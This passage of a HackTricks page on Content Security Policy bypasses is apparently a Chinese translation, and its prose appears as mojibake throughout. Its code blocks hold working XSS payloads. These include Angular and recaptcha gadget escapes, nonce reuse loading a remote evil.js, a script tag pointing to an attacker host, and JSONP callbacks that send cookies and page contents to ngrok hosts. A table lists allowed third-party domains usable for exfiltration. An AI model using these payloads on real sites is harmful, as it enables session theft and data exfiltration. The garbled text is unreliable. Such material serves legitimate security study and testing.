# å†…å®¹å®‰å…¨ç­–ç•¥ (CSP) ç»•è¿‡

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨ Twitter ä¸Šå…³æ³¨** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

åŠ å…¥ [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) æœåŠ¡å™¨ï¼Œä¸ç»éªŒä¸°å¯Œçš„é»‘å®¢å’Œæ¼æ´èµé‡‘çŒäººäº¤æµï¼

**é»‘å®¢è§è§£**\
å‚ä¸æ·±å…¥æ¢è®¨é»‘å®¢çš„åˆºæ¿€ä¸æŒ‘æˆ˜çš„å†…å®¹

**å®æ—¶é»‘å®¢æ–°é—»**\
é€šè¿‡å®æ—¶æ–°é—»å’Œè§è§£ï¼Œè·Ÿä¸Šå¿«é€Ÿå˜åŒ–çš„é»‘å®¢ä¸–ç•Œ

**æœ€æ–°å…¬å‘Š**\
äº†è§£æœ€æ–°çš„æ¼æ´èµé‡‘è®¡åˆ’å’Œé‡è¦å¹³å°æ›´æ–°

**ä»Šå¤©å°±åŠ å…¥æˆ‘ä»¬çš„** [**Discord**](https://discord.com/invite/N3FrSbmwdy)ï¼Œä¸é¡¶å°–é»‘å®¢å¼€å§‹åˆä½œå§ï¼

## ä»€ä¹ˆæ˜¯ CSP

å†…å®¹å®‰å…¨ç­–ç•¥ (CSP) è¢«è®¤ä¸ºæ˜¯ä¸€ç§æµè§ˆå™¨æŠ€æœ¯ï¼Œä¸»è¦æ—¨åœ¨ **é˜²å¾¡è¯¸å¦‚è·¨ç«™è„šæœ¬ (XSS) çš„æ”»å‡»**ã€‚å®ƒé€šè¿‡å®šä¹‰å’Œè¯¦ç»†è¯´æ˜èµ„æºå¯ä»¥å®‰å…¨åŠ è½½çš„è·¯å¾„å’Œæ¥æºæ¥è¿ä½œã€‚è¿™äº›èµ„æºåŒ…æ‹¬å›¾åƒã€æ¡†æ¶å’Œ JavaScript ç­‰å¤šç§å…ƒç´ ã€‚ä¾‹å¦‚ï¼Œç­–ç•¥å¯èƒ½å…è®¸ä»åŒä¸€åŸŸ (self) åŠ è½½å’Œæ‰§è¡Œèµ„æºï¼ŒåŒ…æ‹¬å†…è”èµ„æºä»¥åŠé€šè¿‡ `eval`ã€`setTimeout` æˆ– `setInterval` ç­‰å‡½æ•°æ‰§è¡Œå­—ç¬¦ä¸²ä»£ç ã€‚

CSP çš„å®æ–½é€šè¿‡ **å“åº”å¤´** æˆ–é€šè¿‡å°† **meta å…ƒç´ åµŒå…¥ HTML é¡µé¢** æ¥è¿›è¡Œã€‚éµå¾ªæ­¤æ”¿ç­–åï¼Œæµè§ˆå™¨ä¼šä¸»åŠ¨æ‰§è¡Œè¿™äº›è§„å®šï¼Œå¹¶ç«‹å³é˜»æ­¢ä»»ä½•æ£€æµ‹åˆ°çš„è¿è§„è¡Œä¸ºã€‚

* é€šè¿‡å“åº”å¤´å®æ–½ï¼š
```
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
```
* é€šè¿‡ meta æ ‡ç­¾å®ç°ï¼š
```xml
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```
### Headers

CSP å¯ä»¥é€šè¿‡ä»¥ä¸‹å¤´éƒ¨è¿›è¡Œå¼ºåˆ¶æ‰§è¡Œæˆ–ç›‘æ§ï¼š

* `Content-Security-Policy`: å¼ºåˆ¶æ‰§è¡Œ CSPï¼›æµè§ˆå™¨ä¼šé˜»æ­¢ä»»ä½•è¿è§„è¡Œä¸ºã€‚
* `Content-Security-Policy-Report-Only`: ç”¨äºç›‘æ§ï¼›æŠ¥å‘Šè¿è§„è¡Œä¸ºè€Œä¸é˜»æ­¢å®ƒä»¬ã€‚éå¸¸é€‚åˆåœ¨é¢„ç”Ÿäº§ç¯å¢ƒä¸­è¿›è¡Œæµ‹è¯•ã€‚

### Defining Resources

CSP é™åˆ¶åŠ è½½ä¸»åŠ¨å’Œè¢«åŠ¨å†…å®¹çš„æ¥æºï¼Œæ§åˆ¶è¯¸å¦‚å†…è” JavaScript æ‰§è¡Œå’Œä½¿ç”¨ `eval()` ç­‰æ–¹é¢ã€‚ä¸€ä¸ªç¤ºä¾‹ç­–ç•¥æ˜¯ï¼š
```bash
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```
### æŒ‡ä»¤

* **script-src**: å…è®¸ç‰¹å®šæ¥æºçš„JavaScriptï¼ŒåŒ…æ‹¬URLã€å†…è”è„šæœ¬å’Œç”±äº‹ä»¶å¤„ç†ç¨‹åºæˆ–XSLTæ ·å¼è¡¨è§¦å‘çš„è„šæœ¬ã€‚
* **default-src**: è®¾ç½®åœ¨ç¼ºå°‘ç‰¹å®šè·å–æŒ‡ä»¤æ—¶è·å–èµ„æºçš„é»˜è®¤ç­–ç•¥ã€‚
* **child-src**: æŒ‡å®šå…è®¸çš„Webå·¥ä½œè€…å’ŒåµŒå…¥æ¡†æ¶å†…å®¹çš„èµ„æºã€‚
* **connect-src**: é™åˆ¶å¯ä»¥é€šè¿‡fetchã€WebSocketã€XMLHttpRequestç­‰æ¥å£åŠ è½½çš„URLã€‚
* **frame-src**: é™åˆ¶æ¡†æ¶çš„URLã€‚
* **frame-ancestors**: æŒ‡å®šå¯ä»¥åµŒå…¥å½“å‰é¡µé¢çš„æ¥æºï¼Œé€‚ç”¨äº`<frame>`ã€`<iframe>`ã€`<object>`ã€`<embed>`å’Œ`<applet>`ç­‰å…ƒç´ ã€‚
* **img-src**: å®šä¹‰å…è®¸çš„å›¾åƒæ¥æºã€‚
* **font-src**: æŒ‡å®šé€šè¿‡`@font-face`åŠ è½½çš„å­—ä½“çš„æœ‰æ•ˆæ¥æºã€‚
* **manifest-src**: å®šä¹‰åº”ç”¨ç¨‹åºæ¸…å•æ–‡ä»¶çš„å…è®¸æ¥æºã€‚
* **media-src**: å®šä¹‰åŠ è½½åª’ä½“å¯¹è±¡çš„å…è®¸æ¥æºã€‚
* **object-src**: å®šä¹‰`<object>`ã€`<embed>`å’Œ`<applet>`å…ƒç´ çš„å…è®¸æ¥æºã€‚
* **base-uri**: æŒ‡å®šä½¿ç”¨`<base>`å…ƒç´ åŠ è½½çš„å…è®¸URLã€‚
* **form-action**: åˆ—å‡ºè¡¨å•æäº¤çš„æœ‰æ•ˆç«¯ç‚¹ã€‚
* **plugin-types**: é™åˆ¶é¡µé¢å¯ä»¥è°ƒç”¨çš„mimeç±»å‹ã€‚
* **upgrade-insecure-requests**: æŒ‡ç¤ºæµè§ˆå™¨å°†HTTP URLé‡å†™ä¸ºHTTPSã€‚
* **sandbox**: åº”ç”¨ç±»ä¼¼äº`<iframe>`çš„sandboxå±æ€§çš„é™åˆ¶ã€‚
* **report-to**: æŒ‡å®šå¦‚æœè¿åæ”¿ç­–å°†å‘é€æŠ¥å‘Šçš„ç»„ã€‚
* **worker-src**: æŒ‡å®šWorkerã€SharedWorkeræˆ–ServiceWorkerè„šæœ¬çš„æœ‰æ•ˆæ¥æºã€‚
* **prefetch-src**: æŒ‡å®šå°†è¢«è·å–æˆ–é¢„è·å–çš„èµ„æºçš„æœ‰æ•ˆæ¥æºã€‚
* **navigate-to**: é™åˆ¶æ–‡æ¡£å¯ä»¥é€šè¿‡ä»»ä½•æ–¹å¼å¯¼èˆªçš„URLï¼ˆaã€formã€window.locationã€window.openç­‰ï¼‰ã€‚

### æ¥æº

* `*`: å…è®¸æ‰€æœ‰URLï¼Œé™¤äº†é‚£äº›å…·æœ‰`data:`ã€`blob:`ã€`filesystem:`æ–¹æ¡ˆçš„URLã€‚
* `'self'`: å…è®¸ä»åŒä¸€åŸŸåŠ è½½ã€‚
* `'data'`: å…è®¸é€šè¿‡æ•°æ®æ–¹æ¡ˆåŠ è½½èµ„æºï¼ˆä¾‹å¦‚ï¼ŒBase64ç¼–ç çš„å›¾åƒï¼‰ã€‚
* `'none'`: é˜»æ­¢ä»ä»»ä½•æ¥æºåŠ è½½ã€‚
* `'unsafe-eval'`: å…è®¸ä½¿ç”¨`eval()`å’Œç±»ä¼¼æ–¹æ³•ï¼Œå‡ºäºå®‰å…¨åŸå› ä¸æ¨èä½¿ç”¨ã€‚
* `'unsafe-hashes'`: å¯ç”¨ç‰¹å®šçš„å†…è”äº‹ä»¶å¤„ç†ç¨‹åºã€‚
* `'unsafe-inline'`: å…è®¸ä½¿ç”¨å†…è”èµ„æºï¼Œå¦‚å†…è”`<script>`æˆ–`<style>`ï¼Œå‡ºäºå®‰å…¨åŸå› ä¸æ¨èä½¿ç”¨ã€‚
* `'nonce'`: ä½¿ç”¨åŠ å¯†nonceï¼ˆä¸€æ¬¡æ€§ä½¿ç”¨çš„æ•°å­—ï¼‰å¯¹ç‰¹å®šå†…è”è„šæœ¬çš„ç™½åå•ã€‚
* å¦‚æœæ‚¨æœ‰JSé™åˆ¶æ‰§è¡Œï¼Œå¯ä»¥é€šè¿‡`doc.defaultView.top.document.querySelector("[nonce]")`åœ¨é¡µé¢å†…è·å–ä½¿ç”¨çš„nonceï¼Œç„¶åé‡ç”¨å®ƒåŠ è½½æ¶æ„è„šæœ¬ï¼ˆå¦‚æœä½¿ç”¨äº†strict-dynamicï¼Œä»»ä½•å…è®¸çš„æ¥æºéƒ½å¯ä»¥åŠ è½½æ–°æ¥æºï¼Œå› æ­¤è¿™ä¸æ˜¯å¿…éœ€çš„ï¼‰ï¼Œå¦‚åœ¨ï¼š

<details>

<summary>é‡ç”¨nonceåŠ è½½è„šæœ¬</summary>
```html
<!-- From https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/ -->
<img src=x ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)'>
```
</details>

* `'sha256-<hash>'`: ç™½åå•ç‰¹å®š sha256 å“ˆå¸Œçš„è„šæœ¬ã€‚
* `'strict-dynamic'`: å¦‚æœé€šè¿‡ nonce æˆ–å“ˆå¸Œè¢«åˆ—å…¥ç™½åå•ï¼Œåˆ™å…è®¸ä»ä»»ä½•æ¥æºåŠ è½½è„šæœ¬ã€‚
* `'host'`: æŒ‡å®šç‰¹å®šä¸»æœºï¼Œä¾‹å¦‚ `example.com`ã€‚
* `https:`: é™åˆ¶ URL ä»…ä½¿ç”¨ HTTPSã€‚
* `blob:`: å…è®¸ä» Blob URL åŠ è½½èµ„æºï¼ˆä¾‹å¦‚ï¼Œé€šè¿‡ JavaScript åˆ›å»ºçš„ Blob URLï¼‰ã€‚
* `filesystem:`: å…è®¸ä»æ–‡ä»¶ç³»ç»ŸåŠ è½½èµ„æºã€‚
* `'report-sample'`: åœ¨è¿è§„æŠ¥å‘Šä¸­åŒ…å«è¿è§„ä»£ç çš„ç¤ºä¾‹ï¼ˆå¯¹è°ƒè¯•æœ‰ç”¨ï¼‰ã€‚
* `'strict-origin'`: ç±»ä¼¼äº 'self'ï¼Œä½†ç¡®ä¿æºçš„åè®®å®‰å…¨çº§åˆ«ä¸æ–‡æ¡£åŒ¹é…ï¼ˆåªæœ‰å®‰å…¨æºå¯ä»¥ä»å®‰å…¨æºåŠ è½½èµ„æºï¼‰ã€‚
* `'strict-origin-when-cross-origin'`: åœ¨è¿›è¡ŒåŒæºè¯·æ±‚æ—¶å‘é€å®Œæ•´ URLï¼Œä½†åœ¨è·¨æºè¯·æ±‚æ—¶ä»…å‘é€æºã€‚
* `'unsafe-allow-redirects'`: å…è®¸åŠ è½½ä¼šç«‹å³é‡å®šå‘åˆ°å¦ä¸€ä¸ªèµ„æºçš„èµ„æºã€‚ä¸æ¨èä½¿ç”¨ï¼Œå› ä¸ºè¿™ä¼šå‰Šå¼±å®‰å…¨æ€§ã€‚

## ä¸å®‰å…¨çš„ CSP è§„åˆ™

### 'unsafe-inline'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-inline';
```
å·¥ä½œæœ‰æ•ˆè½½è·: `"/><script>alert(1);</script>`

#### self + 'unsafe-inline' é€šè¿‡ Iframes

{% content-ref url="csp-bypass-self-+-unsafe-inline-with-iframes.md" %}
[csp-bypass-self-+-unsafe-inline-with-iframes.md](csp-bypass-self-+-unsafe-inline-with-iframes.md)
{% endcontent-ref %}

### 'unsafe-eval'

{% hint style="danger" %}
è¿™ä¸èµ·ä½œç”¨ï¼Œæ›´å¤šä¿¡æ¯è¯· [**æŸ¥çœ‹æ­¤å¤„**](https://github.com/HackTricks-wiki/hacktricks/issues/653)ã€‚
{% endhint %}
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-eval';
```
æœ‰æ•ˆè½½è·ï¼š
```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```
### strict-dynamic

å¦‚æœä½ èƒ½ä»¥æŸç§æ–¹å¼ä½¿ä¸€ä¸ª**å…è®¸çš„ JS ä»£ç åˆ›å»ºä¸€ä¸ªæ–°çš„ script æ ‡ç­¾**åœ¨ DOM ä¸­ï¼Œå¹¶ä¸”æ˜¯ç”±å…è®¸çš„è„šæœ¬åˆ›å»ºçš„ï¼Œé‚£ä¹ˆ**æ–°çš„ script æ ‡ç­¾å°†è¢«å…è®¸æ‰§è¡Œ**ã€‚

### Wildcard (\*)
```yaml
Content-Security-Policy: script-src 'self' https://google.com https: data *;
```
å·¥ä½œæœ‰æ•ˆè½½è·ï¼š
```markup
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```
### ç¼ºå°‘ object-src å’Œ default-src

{% hint style="danger" %}
**çœ‹èµ·æ¥è¿™ä¸å†æœ‰æ•ˆ**
{% endhint %}
```yaml
Content-Security-Policy: script-src 'self' ;
```
æœ‰æ•ˆçš„æœ‰æ•ˆè½½è·ï¼š
```markup
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```
### æ–‡ä»¶ä¸Šä¼  + 'self'
```yaml
Content-Security-Policy: script-src 'self';  object-src 'none' ;
```
å¦‚æœæ‚¨å¯ä»¥ä¸Šä¼ ä¸€ä¸ª JS æ–‡ä»¶ï¼Œæ‚¨å¯ä»¥ç»•è¿‡è¿™ä¸ª CSPï¼š

å·¥ä½œæœ‰æ•ˆè½½è·ï¼š
```markup
"/>'><script src="/uploads/picture.png.js"></script>
```
ç„¶è€Œï¼ŒæœåŠ¡å™¨**æ­£åœ¨éªŒè¯ä¸Šä¼ çš„æ–‡ä»¶**ï¼Œå¹¶ä¸”åªå…è®¸æ‚¨**ä¸Šä¼ ç‰¹å®šç±»å‹çš„æ–‡ä»¶**ã€‚

æ­¤å¤–ï¼Œå³ä½¿æ‚¨èƒ½å¤Ÿä½¿ç”¨æœåŠ¡å™¨æ¥å—çš„æ‰©å±•åï¼ˆå¦‚ï¼š_script.png_ï¼‰åœ¨æ–‡ä»¶ä¸­ä¸Šä¼ **JSä»£ç **ï¼Œè¿™ä¹Ÿä¸å¤Ÿï¼Œå› ä¸ºä¸€äº›æœåŠ¡å™¨å¦‚apacheæœåŠ¡å™¨**æ ¹æ®æ‰©å±•åé€‰æ‹©æ–‡ä»¶çš„MIMEç±»å‹**ï¼Œè€ŒåƒChromeè¿™æ ·çš„æµè§ˆå™¨å°†**æ‹’ç»æ‰§è¡Œåº”è¯¥æ˜¯å›¾åƒçš„å†…å®¹ä¸­çš„Javascript**ä»£ç ã€‚â€œå¸Œæœ›â€æœ‰é”™è¯¯ã€‚ä¾‹å¦‚ï¼Œä»ä¸€ä¸ªCTFä¸­æˆ‘äº†è§£åˆ°**Apacheä¸çŸ¥é“**_**.wave**_æ‰©å±•åï¼Œå› æ­¤å®ƒä¸ä¼šä»¥**MIMEç±»å‹å¦‚audio/***æä¾›å®ƒã€‚

ä»è¿™é‡Œå¼€å§‹ï¼Œå¦‚æœæ‚¨å‘ç°XSSå’Œæ–‡ä»¶ä¸Šä¼ ï¼Œå¹¶ä¸”æ‚¨è®¾æ³•æ‰¾åˆ°ä¸€ä¸ª**è¢«è¯¯è§£çš„æ‰©å±•å**ï¼Œæ‚¨å¯ä»¥å°è¯•ä¸Šä¼ ä¸€ä¸ªå…·æœ‰è¯¥æ‰©å±•åå’Œè„šæœ¬å†…å®¹çš„æ–‡ä»¶ã€‚æˆ–è€…ï¼Œå¦‚æœæœåŠ¡å™¨æ­£åœ¨æ£€æŸ¥ä¸Šä¼ æ–‡ä»¶çš„æ­£ç¡®æ ¼å¼ï¼Œå¯ä»¥åˆ›å»ºä¸€ä¸ªå¤šç”¨é€”æ–‡ä»¶ï¼ˆ[è¿™é‡Œæœ‰ä¸€äº›å¤šç”¨é€”æ–‡ä»¶ç¤ºä¾‹](https://github.com/Polydet/polyglot-database)ï¼‰ã€‚

### Form-action

å¦‚æœæ— æ³•æ³¨å…¥JSï¼Œæ‚¨ä»ç„¶å¯ä»¥å°è¯•é€šè¿‡**æ³¨å…¥è¡¨å•æ“ä½œ**æ¥æå–ä¾‹å¦‚å‡­æ®ï¼ˆå¹¶å¯èƒ½æœŸæœ›å¯†ç ç®¡ç†å™¨è‡ªåŠ¨å¡«å†™å¯†ç ï¼‰ã€‚æ‚¨å¯ä»¥åœ¨[**æ­¤æŠ¥å‘Šä¸­æ‰¾åˆ°ä¸€ä¸ªç¤ºä¾‹**](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp)ã€‚å¦å¤–ï¼Œè¯·æ³¨æ„`default-src`ä¸æ¶µç›–è¡¨å•æ“ä½œã€‚

### ç¬¬ä¸‰æ–¹ç«¯ç‚¹ + ('unsafe-eval')

{% hint style="warning" %}
å¯¹äºä»¥ä¸‹æŸäº›æœ‰æ•ˆè´Ÿè½½**`unsafe-eval`ç”šè‡³ä¸éœ€è¦**ã€‚
{% endhint %}
```yaml
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
```
åŠ è½½ä¸€ä¸ªæ˜“å—æ”»å‡»çš„ Angular ç‰ˆæœ¬å¹¶æ‰§è¡Œä»»æ„ JSï¼š
```xml
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>


"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>


"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
</script>
<img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```
#### ä½¿ç”¨ Angular + ä¸€ä¸ªè¿”å› `window` å¯¹è±¡çš„å‡½æ•°åº“çš„æœ‰æ•ˆè½½è· ([æŸ¥çœ‹æ­¤å¸–å­](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/))ï¼š

{% hint style="info" %}
è¯¥å¸–å­æ˜¾ç¤ºæ‚¨å¯ä»¥ **åŠ è½½** æ¥è‡ª `cdn.cloudflare.com`ï¼ˆæˆ–ä»»ä½•å…¶ä»–å…è®¸çš„ JS åº“åº“ï¼‰çš„æ‰€æœ‰ **åº“**ï¼Œæ‰§è¡Œæ¯ä¸ªåº“ä¸­æ·»åŠ çš„æ‰€æœ‰å‡½æ•°ï¼Œå¹¶æ£€æŸ¥ **å“ªäº›åº“ä¸­çš„å“ªäº›å‡½æ•°è¿”å› `window` å¯¹è±¡**ã€‚
{% endhint %}
```markup
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
{{$on.curry.call().alert(1)}}
{{[].empty.call().alert([].empty.call().document.domain)}}
{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().alert('xss')}}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{[].erase.call().alert('xss')}}
</div>
```
Angular XSSæ¥è‡ªç±»åï¼š
```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```
#### æ»¥ç”¨è°·æ­Œ recaptcha JS ä»£ç 

æ ¹æ® [**è¿™ç¯‡ CTF æ–‡ç« **](https://blog-huli-tw.translate.goog/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/?\_x\_tr\_sl=es&\_x\_tr\_tl=en&\_x\_tr\_hl=es&\_x\_tr\_pto=wapp#noteninja-3-solves)ï¼Œä½ å¯ä»¥åœ¨ CSP å†…éƒ¨æ»¥ç”¨ [https://www.google.com/recaptcha/](https://www.google.com/recaptcha/) æ¥æ‰§è¡Œä»»æ„ JS ä»£ç ï¼Œä»è€Œç»•è¿‡ CSPï¼š
```html
<div
ng-controller="CarouselController as c"
ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
```
æ›´å¤š [**æ¥è‡ªæ­¤æ–‡æ¡£çš„æœ‰æ•ˆè½½è·**](https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/):
```html
<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script>

<!-- Trigger alert -->
<img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>

<!-- Reuse nonce -->
<img src=x ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)'>
```
#### åˆ©ç”¨ www.google.com è¿›è¡Œå¼€æ”¾é‡å®šå‘

ä»¥ä¸‹ URL é‡å®šå‘åˆ° example.comï¼ˆæ¥è‡ª [è¿™é‡Œ](https://www.landh.tech/blog/20240304-google-hack-50000/)ï¼‰ï¼š
```
https://www.google.com/amp/s/example.com/
```
æ»¥ç”¨ \*.google.com/script.google.com

å¯ä»¥æ»¥ç”¨ Google Apps Script åœ¨ script.google.com å†…çš„é¡µé¢æ¥æ”¶ä¿¡æ¯ã€‚å°±åƒåœ¨[è¿™ä»½æŠ¥å‘Šä¸­](https://embracethered.com/blog/posts/2023/google-bard-data-exfiltration/)æ‰€åšçš„é‚£æ ·ã€‚

### ç¬¬ä¸‰æ–¹ç«¯ç‚¹ + JSONP
```http
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```
åƒè¿™æ ·çš„åœºæ™¯ï¼Œå…¶ä¸­ `script-src` è®¾ç½®ä¸º `self` å’Œä¸€ä¸ªç‰¹å®šçš„ç™½åå•åŸŸï¼Œå¯ä»¥é€šè¿‡ JSONP ç»•è¿‡ã€‚JSONP ç«¯ç‚¹å…è®¸ä¸å®‰å…¨çš„å›è°ƒæ–¹æ³•ï¼Œè¿™ä½¿å¾—æ”»å‡»è€…èƒ½å¤Ÿæ‰§è¡Œ XSSï¼Œå·¥ä½œæœ‰æ•ˆè½½è·ï¼š
```markup
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```

```html
https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>
```
[**JSONBee**](https://github.com/zigoo0/JSONBee) **åŒ…å«å¯ç”¨äºä¸åŒç½‘ç«™çš„CSPç»•è¿‡çš„ç°æˆJSONPç«¯ç‚¹ã€‚**

å¦‚æœ**å—ä¿¡ä»»çš„ç«¯ç‚¹åŒ…å«å¼€æ”¾é‡å®šå‘**ï¼Œåˆ™ä¼šå‘ç”Ÿç›¸åŒçš„æ¼æ´ï¼Œå› ä¸ºå¦‚æœåˆå§‹ç«¯ç‚¹æ˜¯å—ä¿¡ä»»çš„ï¼Œåˆ™é‡å®šå‘ä¹Ÿæ˜¯å—ä¿¡ä»»çš„ã€‚

### ç¬¬ä¸‰æ–¹æ»¥ç”¨

å¦‚[ä»¥ä¸‹å¸–å­](https://sensepost.com/blog/2023/dress-code-the-talk/#bypasses)æ‰€è¿°ï¼Œæœ‰è®¸å¤šç¬¬ä¸‰æ–¹åŸŸåå¯èƒ½åœ¨CSPä¸­è¢«å…è®¸ï¼Œå¯ä»¥è¢«æ»¥ç”¨ä»¥æå–æ•°æ®æˆ–æ‰§è¡ŒJavaScriptä»£ç ã€‚è¿™äº›ç¬¬ä¸‰æ–¹ä¸­çš„ä¸€äº›æ˜¯ï¼š

| å®ä½“              | å…è®¸çš„åŸŸå                                 | èƒ½åŠ›         |
| ----------------- | ------------------------------------------ | ------------ |
| Facebook          | www.facebook.com, \*.facebook.com          | Exfil        |
| Hotjar            | \*.hotjar.com, ask.hotjar.io              | Exfil        |
| Jsdelivr          | \*.jsdelivr.com, cdn.jsdelivr.net          | Exec         |
| Amazon CloudFront | \*.cloudfront.net                          | Exfil, Exec  |
| Amazon AWS        | \*.amazonaws.com                           | Exfil, Exec  |
| Azure Websites    | \*.azurewebsites.net, \*.azurestaticapps.net | Exfil, Exec  |
| Salesforce Heroku | \*.herokuapp.com                           | Exfil, Exec  |
| Google Firebase   | \*.firebaseapp.com                         | Exfil, Exec  |

å¦‚æœæ‚¨åœ¨ç›®æ ‡çš„CSPä¸­å‘ç°ä»»ä½•å…è®¸çš„åŸŸåï¼Œæ‚¨å¯èƒ½èƒ½å¤Ÿé€šè¿‡åœ¨ç¬¬ä¸‰æ–¹æœåŠ¡ä¸Šæ³¨å†Œæ¥ç»•è¿‡CSPï¼Œå¹¶å°†æ•°æ®æå–åˆ°è¯¥æœåŠ¡æˆ–æ‰§è¡Œä»£ç ã€‚

ä¾‹å¦‚ï¼Œå¦‚æœæ‚¨å‘ç°ä»¥ä¸‹CSPï¼š
```
Content-Security-Policyâ€‹: default-src 'selfâ€™ www.facebook.com;â€‹
```
æˆ–
```
Content-Security-Policyâ€‹: connect-src www.facebook.com;â€‹
```
æ‚¨åº”è¯¥èƒ½å¤Ÿæå–æ•°æ®ï¼Œç±»ä¼¼äºä½¿ç”¨ [Google Analytics](https://www.humansecurity.com/tech-engineering-blog/exfiltrating-users-private-data-using-google-analytics-to-bypass-csp)/[Google Tag Manager](https://blog.deteact.com/csp-bypass/) ä¸€ç›´ä»¥æ¥çš„åšæ³•ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨éµå¾ªä»¥ä¸‹ä¸€èˆ¬æ­¥éª¤ï¼š

1. åœ¨æ­¤å¤„åˆ›å»ºä¸€ä¸ª Facebook å¼€å‘è€…å¸æˆ·ã€‚
